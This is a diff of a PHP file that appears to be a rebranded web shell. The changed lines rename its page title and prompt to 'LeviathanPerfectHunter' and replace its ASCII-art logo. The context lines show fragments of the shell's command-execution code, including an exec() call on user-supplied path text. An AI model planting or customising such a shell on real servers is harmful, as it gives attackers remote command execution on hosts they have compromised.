@@ -1,5 +1,10 @@
 <?php
 
+
+
+
+
+
 function expandPath($path) {
     if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
         exec("echo $match[1]", $stdout);
@@ -116,7 +121,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>Leviathan@PerfectHunter:~#</title>
+        <title>LeviathanPerfectHunter@powny:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -368,7 +373,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "Leviathan@Hunter:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "LeviathanPerfect@Hunter:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -491,14 +496,8 @@ if (isset($_GET["feature"])) {
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">   
-                                                 <span></span>
-  _                _       _   _                 <span></span>               
- | |              (_)     | | | |                <span></span>
- | |     _____   ___  __ _| |_| |__   __ _ _ __  <span></span>
- | |    / _ \ \ / / |/ _` | __| '_ \ / _` | '_ \ <span></span>
- | |___|  __/\ V /| | (_| | |_| | | | (_| | | | |<span></span>
- |______\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|<span></span>
-                                                 <span></span>
+Leviathan Perfect Hunter <span></span>               
+
                 </div>
             </pre>
             <div id="shell-input">
